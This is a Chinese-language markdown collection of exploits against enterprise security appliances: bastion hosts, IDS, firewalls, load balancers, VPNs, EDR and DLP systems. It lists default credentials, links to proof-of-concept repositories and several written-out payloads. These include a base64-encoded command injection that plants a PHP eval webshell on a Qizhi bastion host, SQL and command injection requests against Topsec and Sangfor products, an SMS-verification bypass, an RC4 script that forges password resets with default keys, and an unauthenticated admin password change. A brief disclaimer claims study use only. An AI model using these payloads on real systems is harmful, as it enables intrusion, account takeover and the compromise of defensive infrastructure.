# SecDevice - Exploits

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

# 大纲

* **身份与访问控制**
    * [堡垒机](#堡垒机)

* **网络检测与响应**
    * [IDS](#ids)
    * [防火墙](#防火墙)
    * [网关](#网关)
    * [负载均衡](#负载均衡)
    * [VPN](#vpn)

* **终端响应与检测**
    * [EDR](#edr)
    * [数据防泄漏系统](#数据防泄漏系统)

---

# 身份与访问控制

## 堡垒机

**齐治堡垒机**
- **默认口令**
    - shterm/shterm

- **齐治堡垒机 ShtermClient-2.1.1 命令执行漏洞**
    - [齐治堡垒机ShtermClient-2.1.1命令执行漏洞（CNVD-2019-09593）分析](https://www.cnblogs.com/StudyCat/p/11201725.html)
        ```
        http://10.20.10.11/listener/cluster_manage.php
        https://10.20.10.10/ha_request.php?action=install&ipaddr=10.20.10.11&node_id=1${IFS}|`echo${IFS}" ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK"|base64${IFS}- d|bash`|${IFS}|echo${IFS}
        /var/www/shterm/resources/qrcode/lbj77.php  密码10086
        ```

- **CNVD-2019-20835 齐治堡垒机前台远程命令执行漏洞**
    - [齐治堡垒机前台远程命令执行漏洞（CNVD-2019-20835）分析](https://www.cnblogs.com/StudyCat/p/11256944.html)

- **CNVD-2019-17294 齐治堡垒机后台存在命令执行漏洞**
    - [齐治堡垒机后台存在命令执行漏洞（CNVD-2019-17294）分析](https://www.cnblogs.com/StudyCat/p/11197986.html)

- **远程代码执行**
    - POC | Payload | exp
        ```
        POST /shterm/listener/tui_update.php

        a=["t';import os;os.popen('whoami')#"]
        ```

---

# 网络检测与响应

## IDS

**文章**
- [IDS逃避技术和对策](https://www.oschina.net/question/12_6140)
- [网络层绕过IDS/IPS的一些探索](https://security.tencent.com/index.php/blog/msg/147)

**绿盟 UTS 综合威胁探针**
- **管理员任意登录**
    - POC | Payload | exp
        - [绿盟UTS综合威胁探针管理员任意登录](https://www.hedysx.com/2612.html)
        - [【干货】绿盟UTS综合威胁探针管理员任意登录](https://www.hackbug.net/archives/112.html)

---

## 防火墙

**Cisco ASA**
- **CVE-2018-0296 Cisco ASA Directory Traversal**
    - POC | Payload | exp
        - [yassineaboukir/CVE-2018-0296](https://github.com/yassineaboukir/CVE-2018-0296)

**Sophos XG**
- **CVE-2020-12271 && CVE-2020-15504**
    - 相关文章
        - [Sophos XG - A Tale of the Unfortunate Re-engineering of an N-Day and the Lucky Find of a 0-Day](https://codewhitesec.blogspot.com/2020/07/sophos-xg-tale-of-unfortunate-re.html)

**绿盟 waf 封禁绕过s**
- XFF伪造字段地址为127.0.0.1，导致waf上看不见攻击者地址

---

## 网关

**上海格尔安全认证网关管理系统**
- [上海格尔安全认证网关管理系统命令执行漏洞大礼包](https://php.mengsec.com/bugs/wooyun-2016-0170003.html)
- [上海格尔软件安全认证网关命令执行漏洞（无需登录）](https://php.mengsec.com/bugs/wooyun-2016-0169715.html)
- [上海格尔软件安全认证网关命令执行漏洞（可批量getshell）](https://php.mengsec.com/bugs/wooyun-2016-0170010.html)

---

## 负载均衡

**Citrix ADC**
- **CVE-2019-19781 Citrix Gateway/ADC 远程代码执行漏洞**
    - 文章
        - [Citrix Gateway/ADC 远程代码执行漏洞分析](https://www.freebuf.com/news/232752.html)

    - POC | Payload | exp
        - [trustedsec/cve-2019-19781](https://github.com/trustedsec/cve-2019-19781)

**F5 BIG-IP ADC**
- **CVE-2020-5902 F5 BIG-IP 远程代码执行漏洞**
    - 文章
        - [CVE-2020-5902——关于;号绕过认证技巧总结](https://mp.weixin.qq.com/s/JnI4f3R5JZqhLFv_fTQ_0A)
        - [F5 BIG-IP Remote Code Execution Exploit - CVE-2020-5902 | Critical Start](https://www.criticalstart.com/f5-big-ip-remote-code-execution-exploit/)

    - POC | Payload | exp
        - [jas502n/CVE-2020-5902](https://github.com/jas502n/CVE-2020-5902)
        - [theLSA/f5-bigip-rce-cve-2020-5902](https://github.com/theLSA/f5-bigip-rce-cve-2020-5902)

**天融信 Top-app LB**
- **SQL注入漏洞**
    - POC | Payload | exp
        - [天融信Top-app LB负载均衡SQL注入漏洞](https://www.hedysx.com/2601.html)
            ```
            POST /acc/clsf/report/datasource.php HTTP/1.1
            Host:
            Connection: close
            Accept: text/javascript, text/html, application/xml, text/xml, */*
            X-Prototype-Version: 1.6.0.3
            X-Requested-With: XMLHttpRequest
            User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
            Sec-Fetch-Site: same-origin
            Sec-Fetch-Mode: cors
            Sec-Fetch-Dest: empty
            Accept-Encoding: gzip, deflate
            Accept-Language: zh-CN,zh;q=0.9
            Cookie: PHPSESSID=ijqtopbcbmu8d70o5t3kmvgt57
            Content-Type: application/x-www-form-urlencoded
            Content-Length: 201

            t=l&e=0&s=t&l=1&vid=1+union select 1,2,3,4,5,6,7,8,9,substr('a',1,1),11,12,13,14,15,16,17,18,19,20,21,22-- &o=r_Speed&gid=0&lmt=10&asc=false&p=8&lipf=&lipt=&ripf=&ript=&dscp=&proto=&lpf=&lpt=&rpf=&rpt=
            ```
- **未授权**
    - POC | Payload | exp
        - [天融信负载均衡TopApp-LB系统无需密码直接登陆](https://www.uedbox.com/post/21626/)
            ```
            登录框
            ; ping xxx.dnslog.info; echo
            ```

- **RCE**
    - POC | Payload | exp
        - [天融信TopApp-LB负载均衡命令执行漏洞大量设备可被通杀](https://www.uedbox.com/post/22193/)
            ```
            用户名随意  密码：;id
            ```

---

## VPN

**Fortigate SSL VPN**
- **CVE-2018-13379 Fortigate SSL VPN 密码读取**
    - [milo2012/CVE-2018-13379](https://github.com/milo2012/CVE-2018-13379)
- **CVE-2018-13382 Fortigate SSL VPN 任意密码重置**
    - [milo2012/CVE-2018-13382](https://github.com/milo2012/CVE-2018-13382)

**Palo_Alto SSL VPN**
- **CVE-2019-1579 Palo Alto GlobalProtect 远程代码执行漏洞**
    - 文章
        - [Orange: Attacking SSL VPN - Part 1: PreAuth RCE on Palo Alto GlobalProtect, with Uber as Case Study!](https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html)
        - [Palo Alto GlobalProtect上的PreAuth RCE](https://www.cnblogs.com/backlion/p/11209054.html)

    - POC | Payload | exp
        - [securifera/CVE-2019-1579](https://github.com/securifera/CVE-2019-1579)

**Pulse_Secure SSL VPN**
- **CVE-2019-11510 Pulse Secure SSL VPN 任意文件读取漏洞**
    - 文章
        - [Pulse Secure 任意文件读取（CVE-2019-11510）漏洞](https://www.cnblogs.com/StudyCat/p/11440991.html)

    - POC | Payload | exp
        - [projectzeroindia/CVE-2019-11510](https://github.com/projectzeroindia/CVE-2019-11510)

- **CVE-2019-11539 Pulse Secure SSL VPN 远程代码执行漏洞**
    - [0xDezzy/CVE-2019-11539](https://github.com/0xDezzy/CVE-2019-11539)

**深信服 VPN**
- **口令爆破**
    - POC | Payload | exp
        - https://bbs.sangfor.com.cn/forum.php?mod=viewthread&tid=20633
            ```
            用户登录，若多次尝试登陆失败会要求输入验证码，若输入错误的验证码，会提示“校验码错误或校验码已过期”；修改登录请求的数据包，清空cookie和验证码字段的值即可绕过验证码，此时提示“用户名或密码错误”。
            /por/login_auth.csp?apiversion=1sangfor/cgi-bin/login.cgi?rnd=
            ```

- **短信绕过**
    - POC | Payload | exp
        ```
        POST https://路径/por/changetelnum.csp?apiversion=1

        newtel=TARGET_PHONE&sessReq=clusterd&username=TARGET_USERNAME&grpid=0&sessid=0&ip=127.0.0.1
        ```

- **任意密码重置**
    - POC | Payload | exp
        ```
        某VPN加密算法使用了默认的key,攻击者构利用key构造重置密码数据包从而修改任意用户的密码
        利用:需要登录账号

        M7.6.6R1版本key为20181118

        M7.6.1key为20100720

        POST /por/changepwd.csp

        sessReq=clusterd&sessid=0&str=RC4_STR&len=RC4_STR_LEN(脚本计算后结果)
        ```
        ```py
        from Crypto.Cipher import ARC4
        from binascii import a2b_hex

        def myRC4(data, key):
            rc41= ARC4.new(key)
            encrypted =rc41.encrypt(data)
            return encrypted. encode('hex')

        def rc4_decrpt_hex(data, key):
            rc41= ARC4. new(key)
            return rc41. decrypt(a2b_hex(data))

        key= '20100720'
        data = r',username-TARGET_USERNAME, ip-127.0.0.1,grpid-1, pripsw-suiyi , newpsw=TARGET PASSWORD,'
        print myRC4(data, key)
        ```

---

# 终端响应与检测

## EDR

**深信服 EDR**
- **2020.08命令执行**
    - 相关文章
        - [深信服终端检测响应平台 EDR 代码审计](https://www.sqlsec.com/2020/08/edr.html)
    - POC | Payload | exp
        - [A2gel/sangfor-edr-exploit](https://github.com/A2gel/sangfor-edr-exploit)

- **2020.09命令执行**
    - POC | Payload | exp
        ```
        POST /api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9
        {"params":"w=123\"'1234123'\"|命令"}
        ```

---

## 数据防泄漏系统

**天融信数据防泄漏系统**
- **越权修改管理员密码**
    ```
    无需登录权限,由于修改密码处未校验原密码,且 /?module=auth_user&action=mod_edit_pwd 接口未授权访问,造成直接修改任意用户密码。 默认 superman 账户 uid 为 1。

    POST /?module=auth_user&action=mod_edit_pwd

    Cookie: username=superman;
    uid=1&pd=Newpasswd&mod_pwd=1&dlp_perm=1
    ```
